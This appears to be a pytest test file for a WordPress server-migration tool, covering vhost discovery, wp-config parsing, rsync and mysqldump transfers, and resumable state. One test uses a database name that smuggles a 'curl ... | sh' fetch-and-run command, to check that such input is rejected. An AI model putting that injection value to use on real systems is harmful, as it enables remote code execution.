import os

from migrate import migrate

VHOST = """<VirtualHost *:80>
    ServerName {name}
{extra}    DocumentRoot {root}
</VirtualHost>
"""

APACHE_S = """VirtualHost configuration:
*:80                   is a NameVirtualHost
         default server shop.example.nl ({conf}:{a})
         port 80 namevhost shop.example.nl ({conf}:{a})
                 alias www.shop.example.nl
                 alias winkel.example.nl
         port 80 namevhost plain.example.nl ({conf}:{b})
*:443                  is a NameVirtualHost
         default server shop.example.nl ({conf}:{c})
         port 443 namevhost shop.example.nl ({conf}:{c})
                 alias www.shop.example.nl
                 alias winkel.example.nl
ServerRoot: "/etc/apache2"
Main DocumentRoot: "/var/www/html"
"""


class Server:
    def __init__(self, answers):
        self.answers = answers

    def __call__(self, *args, stdin=None):
        text = " ".join(args)
        for part, answer in self.answers.items():
            if part in text:
                if isinstance(answer, Exception):
                    raise answer
                return answer
        raise migrate.CommandFailed("no answer for " + text)


def _write(path, text):
    os.makedirs(os.path.dirname(str(path)), exist_ok=True)
    with open(str(path), "w") as handle:
        handle.write(text)
    return str(path)


def _conf(tmp_path, shop_root, plain_root):
    conf = "".join([
        VHOST.format(name="shop.example.nl", root=shop_root,
                     extra="    ServerAlias www.shop.example.nl winkel.example.nl\n"),
        "\n\n\n\n",
        VHOST.format(name="plain.example.nl", root=plain_root, extra=""),
        "\n\n\n\n",
        VHOST.format(name="shop.example.nl", root=shop_root, extra="    # a comment\n"),
    ])
    starts = [number for number, line in enumerate(conf.split("\n"), 1) if line.startswith("<VirtualHost")]
    return _write(tmp_path / "sites-enabled" / "shop.conf", conf), starts


def _wp_config(root, name="shopdb", user="shopuser", password="s3cret", host="localhost", prefix="wp_"):
    _write(root / "wp-config.php", """<?php
define( 'DB_NAME', '%s' );
define('DB_USER', '%s');
define("DB_PASSWORD", "%s");
define('DB_HOST', '%s');
$table_prefix = '%s';
""" % (name, user, password, host, prefix))


def _server(made, **extra):
    conf, (a, b, c) = made
    answers = {"apache2ctl": APACHE_S.format(conf=conf, a=a, b=b, c=c),
               "information_schema": "shopdb\t1048576\nmysql\t4096\n"}
    answers.update(extra)
    return Server(answers)


def test_the_sites_come_from_apaches_own_view_of_itself(tmp_path):
    shop, plain = tmp_path / "shop", tmp_path / "plain"
    found = migrate.sites(_server(_conf(tmp_path, shop, plain)))
    assert [site["name"] for site in found] == ["shop.example.nl", "plain.example.nl"]
    assert found[0]["aliases"] == ["www.shop.example.nl", "winkel.example.nl"]
    assert found[0]["docroot"] == str(shop)
    assert found[1]["aliases"] == []
    assert found[1]["docroot"] == str(plain)


def test_a_site_with_wp_config_is_wordpress_with_its_database(tmp_path):
    shop, plain = tmp_path / "shop", tmp_path / "plain"
    _wp_config(shop)
    found = migrate.sites(_server(_conf(tmp_path, shop, plain)))
    site = found[0]
    assert site["wordpress"] is True
    assert (site["database"], site["db_user"], site["db_password"], site["prefix"]) == (
        "shopdb", "shopuser", "s3cret", "wp_")
    assert site["size"] == 1048576
    assert site["problem"] is None


def test_wp_config_is_read_whatever_the_quoting(tmp_path):
    path = _write(tmp_path / "wp-config.php", r"""<?php
// define('DB_NAME', 'commented');
define(   'DB_NAME'  ,  "my db"  );
define('DB_USER', 'it\'s');
define( "DB_PASSWORD" , 'pa"ss\\word' ) ; // the password
define('DB_HOST', 'db.example.nl:3307');
$table_prefix  =  "wp7_";
""")
    assert migrate.wp_settings(path) == {"DB_NAME": "my db", "DB_USER": "it's", "DB_PASSWORD": 'pa"ss\\word',
                                         "DB_HOST": "db.example.nl:3307", "prefix": "wp7_"}
    sock = _write(tmp_path / "other" / "wp-config.php", "define('DB_HOST', 'localhost:/run/mysqld/mysqld.sock');\n")
    assert migrate.wp_settings(sock)["DB_HOST"] == "localhost:/run/mysqld/mysqld.sock"
    assert migrate.wp_settings(sock)["DB_NAME"] is None


def test_a_wp_config_it_cannot_read_marks_the_site_as_a_problem(tmp_path):
    shop, plain = tmp_path / "shop", tmp_path / "plain"
    _wp_config(shop)
    os.mkdir(str(plain))
    os.mkdir(str(plain / "wp-config.php"))  # exists, but can't be read as a file
    found = migrate.sites(_server(_conf(tmp_path, shop, plain)))
    assert found[1]["wordpress"] is True
    assert "can't be read" in found[1]["problem"]
    assert found[1]["database"] is None


def test_a_wp_config_with_empty_credentials_is_a_problem(tmp_path):
    shop, plain = tmp_path / "shop", tmp_path / "plain"
    _wp_config(shop, user="", password="")
    found = migrate.sites(_server(_conf(tmp_path, shop, plain)))
    assert found[0]["wordpress"] is True
    assert "DB_USER, DB_PASSWORD" in found[0]["problem"]


def test_a_site_without_wp_config_is_reported_and_not_wordpress(tmp_path):
    shop, plain = tmp_path / "shop", tmp_path / "plain"
    os.mkdir(str(plain))
    found = migrate.sites(_server(_conf(tmp_path, shop, plain)))
    assert found[1]["wordpress"] is False
    assert found[1]["problem"] is None and found[1]["database"] is None


def test_without_apache2ctl_the_conf_files_are_read(tmp_path):
    shop, plain = tmp_path / "shop", tmp_path / "plain"
    _wp_config(shop)
    conf = _conf(tmp_path, shop, plain)[0]
    server = Server({"apache2ctl": migrate.CommandFailed("apache2ctl isn't installed", missing=True),
                     "information_schema": "shopdb\t10\n"})
    notes = []
    found = migrate.sites(server, notes, sites_dir=os.path.dirname(conf))
    assert [site["name"] for site in found] == ["shop.example.nl", "plain.example.nl"]
    assert found[0]["aliases"] == ["www.shop.example.nl", "winkel.example.nl"]
    assert found[0]["database"] == "shopdb" and found[0]["size"] == 10
    assert any("apache2ctl" in note for note in notes)


def test_database_sizes_that_cannot_be_read_give_a_note_not_an_exception():
    notes = []
    server = Server({"information_schema": migrate.CommandFailed("mariadb failed: denied")})
    assert migrate.database_sizes(server, notes) == {}
    assert "denied" in notes[0]


def test_a_wp_config_above_the_web_directory_is_a_problem_not_plain_files(tmp_path):
    shop, plain = tmp_path / "site" / "public", tmp_path / "plain"
    os.makedirs(str(shop))
    _wp_config(tmp_path / "site")
    found = migrate.sites(_server(_conf(tmp_path, shop, plain)))
    assert found[0]["wordpress"] is True
    assert "outside its web directory" in found[0]["problem"]


def test_a_directory_with_wordpress_files_but_no_wp_config_is_a_problem(tmp_path):
    shop, plain = tmp_path / "shop", tmp_path / "plain"
    _write(shop / "wp-includes" / "version.php", "<?php\n")
    found = migrate.sites(_server(_conf(tmp_path, shop, plain)))
    assert found[0]["wordpress"] is True
    assert "no wp-config.php" in found[0]["problem"]


def test_a_port_with_one_virtual_host_is_not_dropped(tmp_path):
    shop, plain = tmp_path / "shop", tmp_path / "plain"
    conf, (a, b, c) = _conf(tmp_path, shop, plain)
    output = APACHE_S.format(conf=conf, a=a, b=b, c=c) + "*:8443                 lone.example.nl (%s:%d)\n" % (conf, b)
    found = migrate.sites(Server({"apache2ctl": output, "information_schema": ""}))
    assert [site["name"] for site in found] == ["shop.example.nl", "plain.example.nl", "lone.example.nl"]


# ---- Task 12: moving a site's files and database ---------------------------

import json  # noqa: E402
import pytest  # noqa: E402
import sys  # noqa: E402

ROOT = "/home/shopexample/public_html/www"


class Fakes(object):
    """Stand in for rsync and for 'mysqldump | ssh ... adopt'."""

    def __init__(self, rsync_code=0, dump_code=0, adopt_code=0):
        self.rsync, self.pipes = [], []
        self.codes = (rsync_code, dump_code, adopt_code)

    def runner(self, *args):
        self.rsync.append(list(args))
        return self.codes[0]

    def piper(self, first, second, env=None):
        self.pipes.append((list(first), list(second), env))
        return self.codes[1], self.codes[2]


class NewServer(migrate.Connection):
    def __init__(self, tmp_path, replies=None):
        super().__init__("new.example.nl", key=str(tmp_path / "migrate_key"))
        self.requests, self.replies = [], replies or {}

    def ask(self, request, timeout=None):
        self.requests.append(request)
        return self.replies.get(request["request"],
                                {"ok": True, "steps": ["Updated."]})


WP = {"DB_NAME": "oldshop", "DB_USER": "oldshop", "DB_PASSWORD": "s3cret'pw",
      "DB_HOST": "localhost"}
ANSWER = {"ok": True, "docroot": ROOT, "database": "shopexample"}


def _shop(**more):
    return dict({"id": "site:shop.example.nl", "kind": "site",
                 "name": "shop.example.nl", "user": "shopexample",
                 "docroot": "/var/www/shop", "database": "shopexample"},
                **more)


def _notes(tmp_path):
    return migrate.State(path=str(tmp_path / "var" / "state.json"),
                         say=lambda text: None)


def _move(tmp_path, fakes, notes=None, answer=ANSWER, site=None, **more):
    connection = more.pop("connection", None) or NewServer(tmp_path)
    result = migrate.move_site(
        connection, site or _shop(), answer, notes=notes or _notes(tmp_path),
        runner=fakes.runner, piper=fakes.piper,
        settings_of=lambda path: dict(WP), **more)
    return result, connection


def test_the_files_go_with_rsync_as_root_on_the_other_side(tmp_path):
    fakes = Fakes()
    _move(tmp_path, fakes)
    rsync = fakes.rsync[0]
    assert rsync[:2] == ["rsync", "-az"]
    assert rsync[:11] == [
        "rsync", "-az", "-s", "--info=progress2", "--human-readable",
        "--omit-dir-times", "--no-owner", "--no-group", "-e", rsync[9],
        "--rsync-path"]
    assert len(rsync) == 14 and not [w for w in rsync if "delete" in w]
    assert rsync[rsync.index("--rsync-path") + 1] == "sudo -n rsync"
    assert "-i " + str(tmp_path / "migrate_key") in rsync[rsync.index("-e") + 1]
    # Slashes on both ends: the files land IN the web root.
    assert rsync[-2:] == ["/var/www/shop/",
                          "ansible@new.example.nl:" + ROOT + "/"]


def test_a_path_with_a_space_is_not_quoted_for_rsync(tmp_path):
    fakes = Fakes()
    _move(tmp_path, fakes, answer={"docroot": "/home/a b/www"},
          site=_shop(docroot="/var/www/my shop/"))
    assert fakes.rsync[0][-2:] == ["/var/www/my shop/",
                                   "ansible@new.example.nl:/home/a b/www/"]


def test_the_dump_goes_into_the_adopt_and_the_password_in_the_env(tmp_path):
    fakes = Fakes()
    _move(tmp_path, fakes)
    dump, adopt, env = fakes.pipes[0]
    assert dump[:3] == ["mysqldump", "--single-transaction", "--quick"]
    assert dump[-2:] == ["--", "oldshop"]
    assert env == {"MYSQL_PWD": "s3cret'pw"}
    everything = " ".join(dump + adopt + sum(fakes.rsync, []))
    assert "s3cret" not in everything
    assert adopt[0] == "ssh"
    assert adopt[-12:] == ["sudo", "-n", "domainctl", "wp", "adopt",
                           "shopexample", "--database", "shopexample",
                           "--dump", "-", "--replace", "--yes"]


def test_run_piped_streams_one_command_into_the_other(tmp_path):
    out = tmp_path / "out"
    codes = migrate.run_piped(
        [sys.executable, "-c", "print('x' * 100000, end='')"],
        [sys.executable, "-c",
         "import sys; open(%r, 'w').write(sys.stdin.read())" % str(out)])
    assert codes == (0, 0) and len(out.read_text()) == 100000
    assert migrate.run_piped([sys.executable, "-c", "import sys; sys.exit(3)"],
                             ["cat"], env={"A": "1"})[0] == 3


def test_run_command_adds_to_the_environment_for_one_command(monkeypatch):
    monkeypatch.delenv("MIGRATE_X", raising=False)
    out = migrate.run_command("sh", "-c", "echo $MIGRATE_X:$HOME",
                              env={"MIGRATE_X": "1"})
    assert out.startswith("1:") and out.strip() != "1:"  # HOME kept
    assert "MIGRATE_X" not in migrate.os.environ


def test_a_second_run_offers_a_site_whose_files_did_not_arrive(tmp_path):
    site = _shop()
    notes = migrate.State(path=str(tmp_path / "state.json"), say=print)
    exists = {site["id"]: {"state": "exists", "detail": "already here"}}
    assert migrate.offered([site], exists, notes) == []

    connection = NewServer(tmp_path, {"apply": ANSWER})
    broken = Fakes(rsync_code=23)
    report = migrate.run(
        connection, [site], lambda text: None, notes=notes,
        move=migrate.mover(connection, notes, None, runner=broken.runner,
                           piper=broken.piper, settings_of=lambda p: dict(WP)))
    assert report.files_to_copy == [site] and report.moved == []
    saved = json.loads((tmp_path / "state.json").read_text())
    assert saved["items"][site["id"]]["status"] == "made"
    assert "s3cret" not in json.dumps(saved)

    again = migrate.State(path=str(tmp_path / "state.json"), say=print)
    assert migrate.offered([site], exists, again) == [site]
    assert "files still to come" in migrate.items_board([site], exists, again)
    ok = Fakes()
    connection.requests.clear()
    asked = []
    report = migrate.run(
        connection, [site], lambda text: asked.append(text) or "yes",
        notes=again, status=exists,
        move=migrate.mover(connection, again, None, runner=ok.runner,
                           piper=ok.piper, settings_of=lambda p: dict(WP)))
    # No apply happens on this path, so the question about the database is asked here instead.
    assert len(asked) == 1 and "emptied and replaced" in asked[0]
    assert [r["request"] for r in connection.requests] == ["finish_site"]
    assert ok.rsync[0][-1] == "ansible@new.example.nl:" + ROOT + "/"
    assert [i for i, _ in report.moved] == [site]
    state = json.loads((tmp_path / "state.json").read_text())
    assert state["items"][site["id"]]["status"] == "moved"


def test_a_site_that_already_moved_is_not_offered_again_and_says_so(tmp_path):
    """Before the DNS moves the new server says "exists" for a site it made, so only the notes know it is
    finished. Offering it again would run "wp adopt --replace" over a live database."""
    site = _shop()
    notes = _notes(tmp_path)
    notes.made(site, ANSWER)
    notes.moved(site)
    exists = {site["id"]: {"state": "exists", "detail": "waiting for the DNS"}}

    assert migrate.offered([site], exists, notes) == []
    assert "already moved from here" in migrate.items_board([site], exists, notes)
    # --again is the only way back to it, and it finds it before the DNS is flipped.
    assert [i["id"] for i in migrate._to_do_again([site], notes, exists)] == [site["id"]]


def test_a_site_made_in_the_notes_but_new_on_the_server_is_remade(tmp_path):
    site = _shop()
    notes = _notes(tmp_path)
    notes.made(site, ANSWER)
    connection = NewServer(tmp_path, {"apply": ANSWER})
    seen = []
    new = {site["id"]: {"state": "new", "detail": ""}}
    migrate.run(connection, [site], lambda text: None, notes=notes,
                status=new, move=lambda item, answer: seen.append(answer))
    assert [r["request"] for r in connection.requests] == ["apply"]
    assert seen == [ANSWER]


def test_nothing_is_moved_when_the_notes_cannot_be_kept(tmp_path):
    blocked = tmp_path / "file"
    blocked.write_text("not a folder")
    notes = migrate.State(path=str(blocked / "state.json"), say=print)
    connection = NewServer(tmp_path)
    report = migrate.run(connection, [_shop()], lambda text: None, notes=notes)
    assert connection.requests == [] and report.stopped
    assert "Nothing was moved" in report.stopped
    assert report.not_tried == [_shop()]
    # Looking at the dashboard needs no notes at all.
    assert "shop.example.nl" in migrate.items_board([_shop()], {}, notes)


def test_doing_it_again_replaces_the_database_only_when_told(tmp_path):
    asked = []
    fakes = Fakes()
    result, _ = _move(tmp_path, fakes, again=True,
                      ask=lambda text: asked.append(text) or "no")
    assert result["skipped"] and "Nothing was done" in result["message"]
    assert fakes.rsync == [] and fakes.pipes == []
    assert "shopexample" in asked[0] and "shop.example.nl" in asked[0]
    assert "emptied" in asked[0]
    _move(tmp_path, Fakes(), again=True)  # no way to ask: nothing happens
    result, _ = _move(tmp_path, fakes, again=True, ask=lambda text: "yes")
    assert result["ok"] and len(fakes.rsync) == 1 and len(fakes.pipes) == 1


def test_again_without_a_database_asks_nothing(tmp_path):
    fakes = Fakes()
    result, _ = _move(tmp_path, fakes, again=True, site=_shop(database=None))
    assert result["ok"] and fakes.pipes == []


@pytest.mark.parametrize("codes, word", [
    ((0, 2, 0), "mysqldump"), ((0, 0, 1), "read the database in")])
def test_a_failed_dump_or_adopt_leaves_the_site_outstanding_and_says_why(
        tmp_path, codes, word):
    notes = _notes(tmp_path)
    notes.moved(_shop())  # moved once before: now doing it again
    fakes = Fakes(*codes)
    with pytest.raises(migrate.MoveFailed) as failed:
        _move(tmp_path, fakes, notes=notes, again=True, ask=lambda t: "yes")
    text = str(failed.value)
    assert word in text and "OLD server's database" in text
    assert notes.entry(_shop())["status"] == "made"


def test_a_dying_connection_is_not_blamed_on_the_dump(tmp_path):
    with pytest.raises(migrate.MoveFailed) as failed:
        _move(tmp_path, Fakes(0, -13, 255))
    text = str(failed.value)
    assert "connection" in text and "mysqldump" not in text
    assert "OLD server's database" in text


def test_a_failed_finish_leaves_the_site_outstanding(tmp_path):
    notes = _notes(tmp_path)
    notes.moved(_shop())  # so only this run can turn it back into "made"
    connection = NewServer(
        tmp_path, {"finish_site": {"ok": False, "error": "No room."}})
    with pytest.raises(migrate.MoveFailed) as failed:
        _move(tmp_path, Fakes(), notes=notes, connection=connection)
    text = str(failed.value)
    assert "not finished off" in text and "No room." in text
    assert "OLD server" not in text  # the adopt already put that right
    assert notes.entry(_shop())["status"] == "made"


def test_a_missing_destination_stops_before_anything_is_copied(tmp_path):
    fakes = Fakes()
    with pytest.raises(migrate.MoveFailed):
        _move(tmp_path, fakes, answer={"ok": True})
    assert fakes.rsync == []


def test_files_that_vanish_while_copying_are_not_a_failure(tmp_path):
    result, _ = _move(tmp_path, Fakes(rsync_code=24))
    assert result["ok"] and migrate.VANISHED_NOTE in result["steps"]
    with pytest.raises(migrate.MoveFailed):
        _move(tmp_path, Fakes(rsync_code=23))


def test_the_no_delete_note_is_given_once(tmp_path):
    extra = []
    _move(tmp_path, Fakes(), extra_notes=extra)
    _move(tmp_path, Fakes(), extra_notes=extra)
    assert extra == [migrate.NO_DELETE_NOTE]


def test_a_write_that_breaks_halfway_keeps_the_old_file(tmp_path, monkeypatch):
    path = tmp_path / "state.json"
    notes = migrate.State(path=str(path), say=print)
    notes.moved(_shop())
    before = path.read_text()

    def broken(data, handle, **kw):
        handle.write("{ half")
        raise OSError("disk full")
    monkeypatch.setattr(migrate.json, "dump", broken)
    with pytest.raises(migrate.MoveFailed):
        notes.moved(_shop(id="site:b"))
    assert path.read_text() == before
    assert os.listdir(str(tmp_path)) == ["state.json"]


@pytest.mark.parametrize("text", ["{ not json", "[1, 2]", '{"items": 5}'])
def test_notes_that_cannot_be_read_are_said_and_start_empty(tmp_path, text):
    path = tmp_path / "state.json"
    path.write_text(text)
    said = []
    notes = migrate.State(path=str(path), say=said.append)
    assert notes.items == {} and len(said) == 1 and "never filled" in said[0]


def test_notes_of_an_older_form_keep_what_is_usable(tmp_path):
    path = tmp_path / "state.json"
    path.write_text('{"version": 0, "old": 1, "items": '
                    '{"site:a": {"status": "made"}, "x": 5}}')
    said = []
    notes = migrate.State(path=str(path), say=said.append)
    assert notes.items == {"site:a": {"status": "made"}} and said == []
    # An entry without a remembered destination cannot be resumed: the site
    # is made through the new server again, not copied to a guessed place.
    site = _shop(id="site:a")
    connection = NewServer(tmp_path, {"apply": ANSWER})
    status = {"site:a": {"state": "exists"}}
    migrate.run(connection, [site], lambda text: None, notes=notes,
                status=status, move=lambda item, answer: None)
    assert [r["request"] for r in connection.requests] == ["apply"]


def test_item_ids_are_stable_and_the_user_comes_from_the_domain():
    found = [{"name": "Shop.Example.nl", "aliases": [], "docroot": "/nowhere",
              "wordpress": True, "database": "d", "db_user": "u",
              "db_host": "localhost", "size": 5, "problem": None}]
    first = migrate.site_items(found, owner_of=lambda p: "www")
    second = migrate.site_items(found)
    assert first[0]["id"] == second[0]["id"] == "site:shop.example.nl"
    assert first[0]["user"] == "shopexample" and first[0]["old_owner"] == "www"
    assert "password" not in json.dumps(first)


def test_cron_ids_are_stable_and_a_jobs_user_is_its_sites_new_user():
    job = {"user": "wwwdata", "line": "* * * * * /bin/x",
           "site": "shop.example.nl", "interpreter": "php", "settings": [],
           "problem": None}
    first = migrate.cron_items([job, job])
    assert first[0]["user"] == "shopexample"
    assert first[0]["old_user"] == "wwwdata"
    again = migrate.cron_items([job, job])
    assert [i["id"] for i in first] == [i["id"] for i in again]
    assert len({i["id"] for i in first}) == 2
    other = migrate.cron_items([dict(job, line="* * * * * /bin/y")])[0]
    assert other["id"] not in {i["id"] for i in first}
    loose = migrate.cron_items([dict(job, site=None)])[0]
    assert loose["id"] == first[0]["id"]
    assert "belongs to no site" in loose["problem"]
    assert migrate.offered([loose], {loose["id"]: {"state": "new"}}) == []


def _found(*names):
    return [{"name": name, "aliases": [], "docroot": "/var/www/" + name, "wordpress": True, "database": "db",
             "problem": None} for name in names]


def test_two_domains_that_give_one_user_name_do_not_share_it():
    """One company's .nl and .com are the normal case, and one Linux user would mean one web root for both."""
    items = migrate.site_items(_found("example.nl", "example.com"), owner_of=lambda path: None)
    assert [i["user"] for i in items] == ["example", "example"]
    # example.com keeps the name: alphabetical, so the same site keeps it on every run.
    kept, refused = items[1], items[0]
    assert kept["problem"] is None
    assert "example.nl" in refused["problem"] and "example.com" in refused["problem"]
    assert "--user" in refused["problem"]
    status = {i["id"]: {"state": "new", "detail": ""} for i in items}
    assert migrate.offered(items, status) == [kept]
    assert refused["problem"] in " ".join(migrate.items_board(items, status).split())


def test_the_user_asked_for_on_the_command_line_is_the_one_the_site_gets():
    items = migrate.site_items(_found("example.nl", "example.com"), owner_of=lambda path: None,
                               users={"example.nl": "examplenl"})
    assert sorted((i["name"], i["user"]) for i in items) == [("example.com", "example"),
                                                             ("example.nl", "examplenl")]
    assert all(i["problem"] is None for i in items)


def test_a_cron_job_follows_its_sites_user_whatever_it_is_called():
    items = migrate.site_items(_found("example.nl"), owner_of=lambda path: None, users={"example.nl": "examplenl"})
    job = {"user": "www", "line": "* * * * * php /var/www/example.nl/cron.php", "site": "example.nl",
           "command": "php /var/www/example.nl/cron.php", "interpreter": "php", "settings": [], "problem": None}
    assert migrate.cron_items([job], items)[0]["user"] == "examplenl"


def test_user_without_domain_and_a_name_the_new_server_would_refuse_are_both_stopped(capsys):
    assert migrate.main(["list", "--host", "new", "--user", "example"], geteuid=lambda: 0) == 1
    assert "goes with --domain" in capsys.readouterr().out
    assert migrate.main(["list", "--host", "new", "--domain", "a.nl", "--user", "Example Site"], geteuid=lambda: 0) == 1
    assert "isn't a user name" in capsys.readouterr().out


def test_user_needs_to_know_which_site_it_is_for():
    args = migrate._arguments(["list", "--domain", "a.nl", "--user", "one"])
    assert migrate._user_for(_found("a.nl"), "a.nl", "one") == {"a.nl": "one"}
    assert migrate._user_for(_found("shop.a.nl"), "a.nl", "one") == {"shop.a.nl": "one"}
    with pytest.raises(migrate.Stopped) as stopped:
        migrate._user_for(_found("a.nl", "shop.a.nl"), "a.nl2", args.user)
    assert "ONE site" in stopped.value.message and "shop.a.nl" in stopped.value.message


def test_a_failure_that_says_how_far_it_got_reaches_the_report_in_its_own_words(tmp_path):
    """move_site says exactly what is across; a line in front of it saying the opposite is worse than nothing."""
    site = _shop()
    own = ("The files of shop.example.nl are across, but mysqldump stopped with code 2, so the database may be "
           "only partly there.")

    def move(item, answer):
        raise migrate.MoveFailed(own)

    report = migrate.run(NewServer(tmp_path, {"apply": ANSWER}), [site], lambda text: None, move=move)
    assert report.failed == [(site, own)]
    assert report.files_to_copy == [site]
    text = " ".join(migrate.report(report, NewServer(tmp_path)).split())
    assert own in text and migrate.MADE_NOT_FILLED not in text


def test_a_failure_that_knows_nothing_still_says_the_site_was_made(tmp_path):
    def move(item, answer):
        raise migrate.MoveFailed("I couldn't write my notes in /var/lib/migrate (read-only).", told=False)

    report = migrate.run(NewServer(tmp_path, {"apply": ANSWER}), [_shop()], lambda text: None, move=move)
    assert report.failed[0][1].startswith(migrate.MADE_NOT_FILLED)
    assert "couldn't write my notes" in report.failed[0][1]


def test_a_command_that_never_answers_becomes_a_note_and_not_a_hang():
    """A client waiting on a machine that drops packets would otherwise leave the person with an empty screen."""
    assert migrate.LOOK_TIMEOUT == 120  # the limit every discovery command runs with
    with pytest.raises(migrate.CommandFailed) as failed:
        migrate.run_command(sys.executable, "-c", "import time; time.sleep(60)", timeout=1)
    assert "didn't answer within 1 seconds" in failed.value.message
    assert not failed.value.missing  # it is there, it just said nothing

    notes = []
    server = Server({"information_schema": migrate.CommandFailed("mariadb didn't answer within 1 seconds, so it "
                                                                 "was not looked at")})
    assert migrate.database_sizes(server, notes) == {}
    assert "didn't answer" in notes[0]


def test_the_adopt_uses_the_name_the_new_server_made_and_asks_about_the_same_one(tmp_path):
    """The old wp-config.php's name is not the one the new server created: it strips and lower-cases it."""
    asked = []
    fakes = Fakes()
    site = _shop(database=" OldShop ")
    _move(tmp_path, fakes, site=site, answer=dict(ANSWER, database="oldshop"), again=True,
          ask=lambda text: asked.append(text) or "yes")
    adopt = fakes.pipes[0][1]
    assert adopt[adopt.index("--database") + 1] == "oldshop"
    assert "oldshop" in asked[0] and "OldShop" not in asked[0]


def test_a_database_name_the_new_server_would_refuse_never_reaches_a_command(tmp_path):
    """On the resume and --again paths nothing applies the item first, so this is the only check there is."""
    fakes = Fakes()
    site = _shop(database="ok; curl http://example.nl/x | sh")
    with pytest.raises(migrate.MoveFailed) as failed:
        _move(tmp_path, fakes, site=site, answer={"ok": True, "docroot": ROOT})
    assert "Nothing was copied" in str(failed.value)
    assert fakes.rsync == [] and fakes.pipes == []


def test_a_server_without_rsync_makes_no_site_at_all(tmp_path, monkeypatch):
    """Finding this out after the site is made leaves an empty site on the new server."""
    monkeypatch.setattr(migrate.shutil, "which", lambda name: None if name in ("rsync", "mysqldump") else "/bin/x")
    connection = NewServer(tmp_path, {"apply": ANSWER})
    report = migrate.run(connection, [_shop()], lambda text: None)
    assert connection.requests == [] and report.moved == [] and report.files_to_copy == []
    assert "rsync, mysqldump" in report.skipped[0][1] and "apt install rsync mysqldump" in report.skipped[0][1]
    # A site without a database needs no mysqldump.
    monkeypatch.setattr(migrate.shutil, "which", lambda name: None if name == "mysqldump" else "/bin/x")
    assert migrate._missing_programs(_shop(database=None)) == []
    assert migrate._missing_programs(_shop()) == ["mysqldump"]
    assert migrate._missing_programs({"kind": "cron"}) == []


def test_a_site_that_is_not_wordpress_is_listed_and_left_alone():
    """The design has these listed with what was found, not moved: the report said both before."""
    found = [{"name": "static.nl", "aliases": [], "docroot": "/var/www/static", "wordpress": False,
              "database": None, "problem": None}] + _found("shop.nl")
    items = migrate.site_items(found, owner_of=lambda path: None)
    status = {i["id"]: {"state": "new", "detail": ""} for i in items}

    assert "not a WordPress site" in items[0]["problem"] and "/var/www/static" in items[0]["problem"]
    assert migrate.offered(items, status) == [items[1]]
    assert items[0]["problem"] in " ".join(migrate.items_board(items, status).split())

    # It is named once in the report, under the hand work, and never as moved.
    result = migrate.Report()
    result.moved = [(items[1], {"ok": True, "docroot": "/home/shop/public_html/www"})]
    text = migrate.report(result, found_sites=found, items=items, everything=True)
    assert text.count("static.nl") == 1
    assert "static.nl" not in migrate.report(result, found_sites=found, items=items)
    assert "static.nl (files in /var/www/static)" in text


def test_a_site_that_is_not_moved_does_not_hold_a_user_name_another_site_needs():
    found = [{"name": "example.com", "aliases": [], "docroot": "/var/www/com", "wordpress": False,
              "database": None, "problem": None}] + _found("example.nl")
    items = migrate.site_items(found, owner_of=lambda path: None)
    assert items[1]["user"] == "example" and items[1]["problem"] is None


def test_a_site_deleted_on_the_new_server_is_offered_again_and_says_so(tmp_path):
    """The notes must not outlive the new server: a site that is gone there has not moved, whatever they say."""
    site = _shop()
    notes = _notes(tmp_path)
    notes.made(site, ANSWER)
    notes.moved(site)
    gone = {site["id"]: {"state": "new", "detail": "shop.example.nl is not on this server yet."}}

    assert migrate.offered([site], gone, notes) == [site]
    text = " ".join(migrate.items_board([site], gone, notes).split())
    assert migrate.GONE_THERE in text and "already moved from here" not in text
    # --again stays for a site the new server still has, and says so when there is none.
    assert migrate._to_do_again([site], notes, gone) == []


def test_a_site_the_new_server_refuses_is_still_said_to_have_moved(tmp_path):
    site = _shop()
    notes = _notes(tmp_path)
    notes.made(site, ANSWER)
    notes.moved(site)
    refused = {site["id"]: {"state": "refused", "detail": "The user shop already serves another site here."}}
    assert migrate.offered([site], refused, notes) == []
    assert "already moved from here" in migrate.items_board([site], refused, notes)


def test_a_resumed_site_asks_before_its_database_is_replaced_and_no_stops_it(tmp_path):
    """A run that got halfway may have left data in that database, and the dump replaces whatever is there."""
    site = _shop()
    notes = _notes(tmp_path)
    notes.made(site, ANSWER)
    exists = {site["id"]: {"state": "exists", "detail": "waiting for the DNS"}}
    connection = NewServer(tmp_path, {"apply": ANSWER})
    moved = []

    report = migrate.run(connection, [site], lambda text: "no", notes=notes, status=exists,
                         move=lambda item, answer: moved.append(item))

    assert moved == [] and connection.requests == []
    assert report.skipped == [(site, migrate.NOT_REPLACED % "shop.example.nl")]
    assert notes.entry(site)["status"] == "made"  # still outstanding, and still offered next run

    # A site with no database of its own is resumed without a question.
    plain = _shop(id="site:plain.nl", name="plain.nl", database=None)
    notes.made(plain, {"docroot": ROOT})
    migrate.run(connection, [plain], lambda text: "no", notes=notes,
                status={plain["id"]: {"state": "exists"}}, move=lambda item, answer: moved.append(item))
    assert moved == [plain]


def test_every_command_that_looks_something_up_runs_with_the_time_limit(monkeypatch):
    """The limit counts where it is wired in, not only as a number: this goes red if the default is taken away."""
    seen = []

    class Fake(object):
        returncode = 0

        def communicate(self, data=None, timeout=None):
            seen.append(timeout)
            return b"", b""

    monkeypatch.setattr(migrate.subprocess, "Popen", lambda *args, **kwargs: Fake())
    migrate.run_command("mariadb", "--batch", "-e", "SELECT 1")
    assert seen == [migrate.LOOK_TIMEOUT] and migrate.LOOK_TIMEOUT == 120


# ---- The sites of the other web servers ----

NGINX_T = """# configuration file /etc/nginx/nginx.conf:
http {
    server {
        listen 80;
        server_name _;
        root /var/www/html;
    }
    server {
        listen 443 ssl;
        server_name winkel.example.nl www.winkel.example.nl;
        root /home/winkel/public_html;
        location /static/ { root /var/cache/static; }
    }
}
"""

OLS_CONFIG = """serverName                web03
virtualhost Example {
  vhRoot                  Example/
  configFile              conf/vhosts/Example/vhconf.conf
  note                    the one OpenLiteSpeed installs
}
virtualhost club.example.nl {
  vhRoot                  /home/club/club.example.nl
  configFile              $SERVER_ROOT/conf/vhosts/club.example.nl/vhconf.conf
  rewrite  <<<END_rewrite
virtualhost not-a-host { }
END_rewrite
}
listener HTTPS{
  address                 *:443
  map                     Example example.test
  map                     club.example.nl club.example.nl, www.club.example.nl
}
"""


def _lsws(tmp_path, vhconf="docRoot                 $VH_ROOT/html/\n"):
    root = tmp_path / "lsws"
    _write(root / "conf" / "httpd_config.conf", OLS_CONFIG)
    _write(root / "conf" / "vhosts" / "Example" / "vhconf.conf", "docRoot $VH_ROOT/html/\n")
    _write(root / "conf" / "vhosts" / "club.example.nl" / "vhconf.conf", vhconf)
    return str(root)


